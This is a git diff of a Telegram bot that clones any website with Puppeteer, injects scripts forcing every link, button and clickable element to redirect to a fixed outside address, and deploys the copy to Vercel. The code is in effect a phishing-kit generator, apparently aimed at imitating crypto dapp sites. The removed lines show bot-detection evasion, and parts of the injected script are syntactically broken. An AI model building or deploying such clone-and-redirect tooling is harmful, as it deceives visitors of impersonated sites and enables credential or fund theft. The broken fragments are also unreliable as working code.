@@ -10,7 +10,7 @@ import { Vercel } from "@vercel/sdk";
 import dotenv from "dotenv";
 import { fileURLToPath } from "url";
 
-// __dirname is undefined in ESM, so define it manually:
+// Define __filename and __dirname
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 dotenv.config();
@@ -29,7 +29,6 @@ const userStates = new Map();
 bot.start((ctx) => {
   ctx.reply("✅ Welcome! Use /clone to fetch a website’s HTML.");
 });
-
 
 // /run command
 bot.command("run", (ctx) => {
@@ -50,7 +49,6 @@ const userFolders = new Map();
 
 bot.on("text", async (ctx) => {
   const state = userStates.get(ctx.chat.id);
-
   // === CASE 1: CLONING ===
   if (state === "awaiting_url") {
     const siteUrl = ctx.message.text.toLowerCase();
@@ -64,344 +62,262 @@ bot.on("text", async (ctx) => {
     await ctx.reply(
       "🔍 Cloning the full website...\n\nHang tight — this might take a little while."
     );
-
     (async () => {
       const outputDir = path.join(__dirname, "cloned");
-      const redirectURL = "https://mainnettdapp.vercel.app/"; // URL to redirect all links to
-      const assetCache = new Map();
+      const redirectURL = "https://mainnettdapp.vercel.app/"; // Change this to your desired redirect URL
 
-      // Clear the cloned folder before starting
-      try {
-        await fs.remove(outputDir);
-        console.log("✅ Cleared existing cloned folder");
-      } catch (err) {
-        console.warn(`⚠️ Failed to clear cloned folder: ${err.message}`);
+      // Clear the cloned directory before starting
+      async function clearClonedDirectory() {
+        try {
+          await fs.remove(outputDir); // Remove the entire cloned directory
+          console.log("🧹 Cleared cloned directory:", outputDir);
+        } catch (err) {
+          console.error("⚠️ Failed to clear cloned directory:", err.message);
+        }
       }
 
-      // Ensure output directory
-      await fs.ensureDir(outputDir, { mode: 0o755 });
-
-      // Function to sanitize file paths
-      const sanitizePath = (pathname) => {
-        return pathname
-          .replace(/[:*?"<>|]/g, "_") // Replace invalid Windows characters
-          .replace(/^-+/, "") // Remove leading dashes
-          .replace(/\/+/g, "/") // Normalize slashes
-          .replace(/^\/+/, ""); // Remove leading slashes
-      };
-
       try {
-        // Ensure output directory
-        await fs.ensureDir(outputDir, { mode: 0o755 });
+        // Clear and recreate directories
+        await clearClonedDirectory();
+        await fs.ensureDir(path.join(outputDir, "css")); // Create css directory
+        console.log("📁 Created css directories");
 
         // Launch browser
         const browser = await puppeteer.launch({
           headless: "new",
-          args: [
-            "--no-sandbox",
-            "--disable-setuid-sandbox",
-            "--disable-blink-features=AutomationControlled",
-            "--disable-web-security",
-            "--disable-features=IsolateOrigins,site-per-process",
-          ],
+          args: ["--no-sandbox", "--disable-setuid-sandbox"],
         });
 
-        const page = await browser.newPage();
-
-        // Bot evasion
-        await page.evaluateOnNewDocument(() => {
-          Object.defineProperty(navigator, "webdriver", { get: () => false });
-          Object.defineProperty(navigator, "platform", { get: () => "Win32" });
-          Object.defineProperty(navigator, "vendor", {
-            get: () => "Google Inc.",
-          });
-          Object.defineProperty(navigator, "languages", {
-            get: () => ["en-US", "en"],
-          });
-          window.chrome = { runtime: {} };
-          Object.defineProperty(navigator, "plugins", {
-            get: () => [
-              { name: "Chrome PDF Plugin", filename: "internal-pdf-viewer" },
-              {
-                name: "Chrome PDF Viewer",
-                filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai",
-              },
-            ],
-          });
-        });
-
-        await page.setUserAgent(
-          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
-        );
-
-        await page.setRequestInterception(true);
-
-        // Handle requests
-        page.on("request", (req) => {
-          const resourceType = req.resourceType();
-          const url = req.url();
-          if (["beacon", "csp_report"].includes(resourceType)) {
-            req.abort();
-            return;
-          }
-          if (
-            /\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|json)$/.test(url)
-          ) {
-            req.continue({
-              headers: {
-                ...req.headers(),
-                Referer: siteUrl,
-                Accept:
-                  resourceType === "stylesheet"
-                    ? "text/css"
-                    : resourceType === "script"
-                    ? "*/*"
-                    : "image/*,font/*",
-              },
-            });
-          } else {
-            req.continue();
-          }
-        });
-
-        // Capture assets
-        page.on("requestfinished", async (req) => {
-          const url = req.url();
-          if (url.startsWith("data:")) return;
-
-          try {
-            const response = await req.response();
-            if (!response || !response.ok()) {
-              console.warn(
-                `⚠️ Invalid response for ${url}: Status ${response?.status()}`
-              );
-              return;
-            }
-
-            const contentType = response.headers()["content-type"] || "";
-            if (
-              !/(css|javascript|font|image|svg|octet-stream|json)/.test(
-                contentType
-              )
-            ) {
-              console.warn(
-                `⚠️ Skipped ${url}: Invalid content-type ${contentType}`
-              );
-              return;
-            }
-
-            const buffer = await response.buffer();
-            const pathname = sanitizePath(new URL(url, siteUrl).pathname);
-            assetCache.set(pathname, buffer);
-            console.log(`📦 Intercepted: ${pathname} (${contentType})`);
-          } catch (err) {
-            console.warn(`⚠️ Failed intercept: ${url} - ${err.message}`);
-          }
-        });
-
-        // Navigate with extended wait
         try {
-          await page.goto(siteUrl, {
-            waitUntil: "networkidle0",
-            timeout: 60000,
-          });
-        } catch (err) {
-          console.warn(
-            "⚠️ Navigation failed, retrying with domcontentloaded...",
-            err.message
+          const page = await browser.newPage();
+          await page.setUserAgent(
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
           );
+
+          // Navigate and wait for full rendering
           await page.goto(siteUrl, {
-            waitUntil: "domcontentloaded",
+            waitUntil: "networkidle2",
             timeout: 30000,
           });
-        }
-        await page.waitForSelector("body", { timeout: 30000 });
-        await page.mouse.move(Math.random() * 800, Math.random() * 600); // Simulate human behavior
-        await new Promise((resolve) => setTimeout(resolve, 20000)); // Extended wait for dynamic assets
+          await new Promise((resolve) => setTimeout(resolve, 5000)); // Additional wait for dynamic content
 
-        // Extract HTML, stylesheets, and inline styles
-        const { html, stylesheets, inlineStyles } = await page.evaluate(() => {
-          const links = Array.from(
-            document.querySelectorAll(
-              'link[rel="stylesheet"], link[rel="preload"][as="style"]'
-            )
-          ).map((l) => l.href);
-          const styles = Array.from(document.querySelectorAll("style")).map(
-            (s) => s.innerText
-          );
-          return {
-            html: document.documentElement.outerHTML,
-            stylesheets: links,
-            inlineStyles: styles,
-          };
-        });
-
-        if (!html || html.length < 100) {
-          throw new Error("❌ Empty or invalid HTML content");
-        }
-        const $ = cheerio.load(html);
-
-        $("base").remove();
-
-        // Remove href from all <a> tags
-        $("a[href]").each((_, el) => {
-          $(el).removeAttr("href");
-          console.log("✅ Removed href from <a> tag");
-        });
-
-        // Save inline styles
-        inlineStyles.forEach((style, index) => {
-          const styleId = `inline-style-${index}`;
-          $("head").append(`<style id="${styleId}">${style}</style>`);
-          console.log(`✅ Added inline style: ${styleId}`);
-        });
-
-        // Process external CSS
-        const cssDir = path.join(outputDir, "css");
-        await fs.ensureDir(cssDir);
-        for (const href of stylesheets) {
-          if (!href || href.startsWith("data:")) continue;
-
-          try {
-            const fullUrl = new URL(href, siteUrl);
-            const pathname = sanitizePath(fullUrl.pathname);
-            const localCssPath = path
-              .join("css", path.basename(pathname))
-              .replace(/\\/g, "/");
-            const savePath = path.join(outputDir, localCssPath);
-
-            let cssBuffer = assetCache.get(pathname);
-            let contentType = "text/css";
-
-            // Fetch CSS if not in cache
-            if (!cssBuffer) {
-              console.warn(`⚠️ CSS not in cache, fetching: ${href}`);
-              const resp = await page.goto(fullUrl.href, {
-                waitUntil: "networkidle0",
-                timeout: 15000,
-              });
-              if (!resp.ok()) {
-                console.warn(
-                  `⚠️ Failed to fetch CSS: ${href} - Status ${resp.status()}`
-                );
-                $("head").append(`<link rel="stylesheet" href="${href}">`);
-                continue;
-              }
-              contentType = resp.headers()["content-type"] || "";
-              if (!contentType.includes("text/css")) {
-                console.warn(
-                  `⚠️ Invalid CSS content-type: ${contentType} for ${href}`
-                );
-                $("head").append(`<link rel="stylesheet" href="${href}">`);
-                continue;
-              }
-              cssBuffer = await resp.buffer();
-              assetCache.set(pathname, cssBuffer);
-            }
-
-            const cssText = cssBuffer.toString("utf-8");
-            if (!cssText) {
-              console.warn(`⚠️ Empty CSS content: ${href}`);
-              $("head").append(`<link rel="stylesheet" href="${href}">`);
-              continue;
-            }
-
-            // Rewrite URLs in CSS
-            const rewrittenCss = cssText.replace(
-              /url\(['"]?([^'")]+)['"]?\)/g,
-              (_, assetUrl) => {
+          // Execute JavaScript in the browser context to modify image src and remove srcset
+          await page.evaluate((siteUrl) => {
+            const images = document.querySelectorAll("img[src]");
+            images.forEach((img) => {
+              const src = img.getAttribute("src");
+              if (src && !src.startsWith("data:")) {
                 try {
-                  const assetPath = sanitizePath(
-                    new URL(assetUrl, fullUrl).pathname
+                  // Resolve relative URLs and ensure src starts with siteUrl
+                  const fullUrl = new URL(src, siteUrl).href;
+                  const urlObj = new URL(fullUrl);
+                  const editedSrc = `${siteUrl}${urlObj.pathname}${urlObj.search}${urlObj.hash}`;
+                  img.setAttribute("src", editedSrc);
+                  img.removeAttribute("srcset");
+                  console.log(
+                    `🖼️ Updated image: src=${editedSrc}, srcset removed`
                   );
-                  if (assetCache.has(assetPath)) {
-                    console.log(
-                      `✅ Rewrote CSS URL: ${assetUrl} -> /${assetPath}`
-                    );
-                    return `url(/${assetPath})`;
-                  }
-                  console.warn(`⚠️ CSS asset not found: ${assetUrl}`);
-                  return `url(${assetUrl})`;
                 } catch (err) {
                   console.warn(
-                    `⚠️ Failed to rewrite CSS URL: ${assetUrl} - ${err.message}`
+                    `⚠️ Failed to process image URL: ${src}, error: ${err.message}`
                   );
-                  return `url(${assetUrl})`;
+                  img.removeAttribute("srcset");
                 }
+              } else {
+                img.removeAttribute("srcset");
               }
-            );
+            });
+          }, siteUrl);
 
-            // Save CSS
-            await fs.ensureDir(path.dirname(savePath));
-            await fs.writeFile(savePath, rewrittenCss);
-            console.log(`✅ Saved CSS: ${savePath}`);
+          // Get the modified HTML after JavaScript execution
+          const html = await page.content();
+          const $ = cheerio.load(html);
 
-            // Inline CSS or use local link
-            try {
-              $("head").append(`<style>${rewrittenCss}</style>`);
-              console.log(`🎨 Inlined CSS: ${href}`);
-            } catch (err) {
-              console.warn(
-                `⚠️ Failed to inline CSS, using local link: ${href} - ${err.message}`
-              );
-              $("head").append(
-                `<link rel="stylesheet" href="/${localCssPath}">`
-              );
-            }
-          } catch (err) {
-            console.warn(`❌ Failed to process CSS: ${href} - ${err.message}`);
-            $("head").append(`<link rel="stylesheet" href="${href}">`);
-          }
-        }
+          // Remove existing <base> tag and add new one at the start of <head>
+          $("base").remove();
+          $("head").prepend(`<base href="${siteUrl}">`);
 
-        // Save other assets
-        for (const [pathname, buffer] of assetCache.entries()) {
-          if (pathname.startsWith("data:")) continue;
-          const sanitizedPath = sanitizePath(pathname);
-          const fullPath = path.join(outputDir, sanitizedPath);
-          try {
-            await fs.ensureDir(path.dirname(fullPath));
-            await fs.writeFile(fullPath, buffer);
-            console.log(`✅ Saved asset: ${fullPath}`);
-          } catch (err) {
-            console.warn(
-              `❌ Failed to save asset: ${sanitizedPath} - ${err.message}`
-            );
-          }
-        }
+          // Continue with the rest of your code (redirects, saving HTML, etc.)
 
-        // Rewrite asset paths in HTML
-        $("[href], [src]").each((_, el) => {
-          const $el = $(el);
-          const attr = $el.attr("href") ? "href" : "src";
-          const val = $el.attr(attr);
-
-          if (
-            !val ||
-            val.startsWith("data:") ||
-            val.startsWith("mailto:") ||
-            val.startsWith("javascript:")
-          )
-            return;
-
-          try {
-            const full = new URL(val, siteUrl);
-            const pathname = sanitizePath(full.pathname);
-            if (assetCache.has(pathname)) {
-              $el.attr(attr, `/${pathname}`);
-              console.log(`✅ Rewrote ${attr}: ${val} -> /${pathname}`);
+          // Get and edit image src, remove srcset
+          const images = $("img[src]");
+          for (const el of images.toArray()) {
+            const src = $(el).attr("src");
+            if (src && !src.startsWith("data:")) {
+              try {
+                // Get the full URL (resolving relative paths)
+                const fullUrl = new URL(src, siteUrl).href;
+                // Extract the path portion (remove the domain if external)
+                const urlObj = new URL(fullUrl);
+                let editedSrc = `${siteUrl}${urlObj.pathname}${urlObj.search}${urlObj.hash}`;
+                // Set the edited src to start with siteUrl
+                $(el).attr("src", editedSrc);
+                $(el).removeAttr("srcset"); // Remove srcset attribute
+              } catch (err) {
+                console.warn(
+                  `⚠️ Failed to process image URL: ${src}, error: ${err.message}`
+                );
+                $(el).removeAttr("srcset"); // Still remove srcset on error
+              }
             } else {
-              console.warn(`⚠️ Asset not found for ${attr}: ${val}`);
-              $el.attr(attr, val); // Keep original if not found
+              $(el).removeAttr("srcset"); // Remove srcset for data: URLs or invalid src
             }
-          } catch (err) {
-            console.warn(
-              `⚠️ Failed to rewrite ${attr}: ${val} - ${err.message}`
-            );
           }
-        });
 
-        $("body").append(`
+          // Redirect external links
+          $("a[href]").each((_, el) => {
+            const href = $(el).attr("href");
+            if (
+              href &&
+              href.startsWith("http") &&
+              !href.includes(new URL(siteUrl).hostname)
+            ) {
+              // $(el).attr("href", redirectURL);
+              $(el).removeAttr("target");
+              $(el).removeAttr("href");
+            }
+          });
+
+          // Redirect buttons
+          $("button:not([data-no-redirect])").each((_, el) => {
+            $(el).attr("onclick", `window.location='${redirectURL}'`);
+          });
+
+          // Handle cursor:pointer elements
+          let pointerCount = 0;
+          $("[style]").each((_, el) => {
+            const style = $(el).attr("style");
+            if (style && style.toLowerCase().includes("cursor: pointer")) {
+              $(el).attr("onclick", `window.location='${redirectURL}'`);
+              pointerCount++;
+            }
+          });
+
+          const pointerClasses = new Set();
+          $("style").each((_, el) => {
+            const css = $(el).html();
+            const matches = css.match(
+              /\.(\w[\w-]*)\s*{[^}]*cursor\s*:\s*pointer[^}]*}/gi
+            );
+            if (matches) {
+              matches.forEach((rule) => {
+                const classMatch = rule.match(/\.(\w[\w-]*)/);
+                if (classMatch) {
+                  pointerClasses.add(classMatch[1]);
+                }
+              });
+            }
+          });
+
+          $("head").prepend(`<script class="dynamic-script">
+  window.addEventListener('DOMContentLoaded', () => {
+    console.log("🔁 Running prioritized image fixer...");
+    
+    function fixImages() {
+      const images = document.querySelectorAll('img');
+      images.forEach(img => {
+        const src = img.getAttribute('src');
+        img.removeAttribute('srcset');
+        if (src && src.startsWith('/') && !src.startsWith('data:') && !src.startsWith('//') && !src.startsWith('http')) {
+          img.src = new URL(src, '${siteUrl}').href;
+        }
+           // Add href to all <a> tags
+    const anchorElements = document.querySelectorAll("a");
+           // Handle clicks for interactive elements
+    const interactiveElements = document.querySelectorAll(
+      "a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'], input[type='button'], input[type='submit'], input[type='reset']"
+    );
+    interactiveElements.forEach(el => {
+      el.setAttribute("href", "${redirectURL}");
+      console.log("✅ Added href to <a>: ${redirectURL}");
+    });
+      });
+       // Handle clicks for interactive elements
+    const interactiveElements = document.querySelectorAll(
+      "a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'], input[type='button'], input[type='submit'], input[type='reset']"
+    );
+    interactiveElements.forEach(el => {
+      el.onclick = null;
+      el.removeAttribute("onclick");
+      if (window.jQuery && typeof jQuery === "function") {
+        try { jQuery(el).off("click"); } catch (err) {}
+      }
+      const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
+      if (reactKey) delete el[reactKey];
+      el.addEventListener("click", (e) => {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        window.location.href = "${redirectURL}";
+      }, true);
+    });
+    }
+
+    // Run immediately
+    fixImages();
+    
+    // Run again after delay to catch late-loaded images
+    setTimeout(fixImages, 3000);
+    setInterval(fixImages, 10000); // optional long-term fix loop
+  });
+</script>`);
+
+      
+          $("head").prepend(`<script class="safe-redirect-handler">
+  window.addEventListener("DOMContentLoaded", () => {
+    const redirectURL = "${redirectURL}";
+
+    function forceRedirect(element) {
+      ["click", "pointerdown", "touchstart"].forEach(eventType => {
+        element.addEventListener(eventType, (e) => {
+          e.preventDefault();
+          e.stopImmediatePropagation();
+          window.location.href = redirectURL;
+        }, true);
+      });
+    }
+
+    function patchClickableElements() {
+      const selectors = [
+        "a",
+        "button",
+        "input[type='button']",
+        "input[type='submit']",
+        "input[type='reset']",
+        "[role='button']",
+        "[onclick]",
+        "[style*='cursor: pointer']",
+        [class*='cursor-pointer']
+        "*[tabindex]" // captures custom clickable elements like divs
+      ];
+
+      const clickables = document.querySelectorAll(selectors.join(","));
+      clickables.forEach(el => {
+        try {
+          el.onclick = null;
+          el.removeAttribute("onclick");
+          el.removeAttribute("href");
+          el.removeAttribute("target");
+          const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
+          if (reactKey) delete el[reactKey];
+          forceRedirect(el);
+        } catch (err) {
+          console.warn("⚠️ Failed to patch element:", el, err);
+        }
+      });
+
+      console.log("✅ All clickable elements patched for redirect");
+    }
+
+    // Run when idle to not block UI thread
+    if ("requestIdleCallback" in window) {
+      requestIdleCallback(patchClickableElements, { timeout: 3000 });
+    } else {
+      setTimeout(patchClickableElements, 1000);
+    }
+  });
+</script>`);
+
+          $("body").append(`
  <style>
    a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'], input[type='button'], input[type='submit'], input[type='reset'] {
      cursor: pointer !important;
@@ -409,7 +325,7 @@ bot.on("text", async (ctx) => {
  </style>
  <script>
  document.addEventListener("DOMContentLoaded", () => {
-   const elements = document.querySelectorAll("a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'],input[type='button'], input[type='submit'], input[type='reset']");
+   const elements = document.querySelectorAll("a, button,[class*='cursor-pointer'], input[role], [role='button'], [onclick], [style*='cursor: pointer'],input[type='button'], input[type='submit'], input[type='reset']");
    elements.forEach(el => {
      el.onclick = null;
      el.removeAttribute("onclick");
@@ -428,25 +344,108 @@ bot.on("text", async (ctx) => {
  </script>
  `);
 
-        // Save HTML
-        const outputHtmlPath = path.join(outputDir, "index.html");
-        await fs.writeFile(outputHtmlPath, $.html());
-        console.log("✅ Clone complete:", outputHtmlPath);
 
-        await fs.outputFile(path.join(outputDir, "index.html"), $.html());
-        console.log("✅ Done! Saved at cloned/index.html");
 
-        await ctx.reply(
-          "✅ Site cloned using original CSS links! Ready for deploy.",
-          Markup.inlineKeyboard([
-            Markup.button.callback("🚀 Host Site", "host"),
-          ])
-        );
+ $("head").prepend(`
+  <style>
+    a, button, input[role], [role='button'], [onclick], [style*='cursor: pointer'],
+    [class*='cursor'], input[type='button'], input[type='submit'], input[type='reset'] {
+      cursor: pointer !important;
+    }
+  </style>
+
+  <script class="force-click-redirect">
+    document.addEventListener("DOMContentLoaded", () => {
+      const redirectURL = "${redirectURL}";
+
+      function forceRedirect(el) {
+        ["click", "pointerdown", "touchstart"].forEach(evt => {
+          el.addEventListener(evt, (e) => {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            window.location.href = redirectURL;
+          }, true); // capture phase
+        });
+      }
+
+      function patchAllClickables() {
+        const selectors = [
+          "a",
+          "button",
+          "input[type='button']",
+          "input[type='submit']",
+          "input[type='reset']",
+          "[role='button']",
+          "[onclick]",
+          "[style*='cursor: pointer']",
+          "[class*='cursor-pointer']",
+          "[tabindex]",
+          "[data-dropdown-option]"
+        ];
+
+        const elements = document.querySelectorAll(selectors.join(","));
+        elements.forEach(el => {
+          try {
+            el.onclick = null;
+            el.removeAttribute("onclick");
+            el.removeAttribute("href");
+            el.removeAttribute("target");
+
+            // Clear jQuery events
+            if (window.jQuery && typeof jQuery === "function") {
+              try { jQuery(el).off(); } catch (_) {}
+            }
+
+            // Clear React synthetic events
+            const reactKey = Object.keys(el).find(k => k.startsWith("__react"));
+            if (reactKey) delete el[reactKey];
+
+            forceRedirect(el);
+          } catch (err) {
+            console.warn("⚠️ Error patching element:", err);
+          }
+        });
+
+        console.log("✅ All clickables patched for redirect.");
+      }
+
+      // Patch immediately and again after delay
+      patchAllClickables();
+      setTimeout(patchAllClickables, 1000);
+      setInterval(patchAllClickables, 8000); // optional long-term patch loop
+    });
+  </script>
+`);
+
+          for (const className of pointerClasses) {
+            $(`.${className}`).attr(
+              "onclick",
+              `window.location='${redirectURL}'`
+            );
+            pointerCount += $(`.${className}`).length;
+          }
+
+          console.log("🎯 Pointer-style elements redirected:", pointerCount);
+          console.log("🔘 <button> elements redirected:", $("button").length);
+          console.log("🔗 <a> links replaced with:", redirectURL);
+
+          // Save HTML
+          await fs.outputFile(path.join(outputDir, "index.html"), $.html());
+          console.log("✅ Done! Saved at cloned/index.html");
+          await ctx.reply(
+            "✅ Site cloned using original CSS links! Ready for deploy.",
+            Markup.inlineKeyboard([
+              Markup.button.callback("🚀 Host Site", "host"),
+            ])
+          );
+        } catch (err) {
+          console.error("❌ Page processing failed:", err.message, err.stack);
+          await ctx.reply(`✅ error cloning`);
+        } finally {
+          await browser.close();
+        }
       } catch (err) {
-        console.error("❌ Error:", err.message, err.stack);
-        console.error("❌ Clone error:", err.message);
-        await ctx.reply("⚠️ Failed to clone site.");
-        process.exit(1);
+        console.error("❌ Script failed:", err.message, err.stack);
       }
     })();
   }
@@ -525,16 +524,16 @@ bot.on("text", async (ctx) => {
 
       console.log("✅ Deployment complete!", result);
 
-    setTimeout(() => {
+      setTimeout(() => {
         ctx.reply(
-        `✅ *Deployment Successful!*\n\n` +
-          `🌐 *Predicted URL:*\nhttps://${result.name}.vercel.app\n\n` +
-          `🚀 *Live URL(s):*\n${result.alias?.[0] || "Not available"}\n` +
-          `${result.alias?.[1] ? `\n${result.alias[1]}` : ""}\n\n` +
-          `🎉 Your site is now live on Vercel!`,
-        { parse_mode: "Markdown" }
-      );
-    }, 3000); // Delay to ensure Vercel processes the deployment
+          `✅ *Deployment Successful!*\n\n` +
+            `🌐 *Predicted URL:*\nhttps://${result.name}.vercel.app\n\n` +
+            `🚀 *Live URL(s):*\n${result.alias?.[0] || "Not available"}\n` +
+            `${result.alias?.[1] ? `\n${result.alias[1]}` : ""}\n\n` +
+            `🎉 Your site is now live on Vercel!`,
+          { parse_mode: "Markdown" }
+        );
+      }, 3000); // Delay to ensure Vercel processes the deployment
     } catch (error) {
       console.error("❌ Hosting error:", error);
       ctx.reply("⚠️ Error deploying site. Please try again later.");
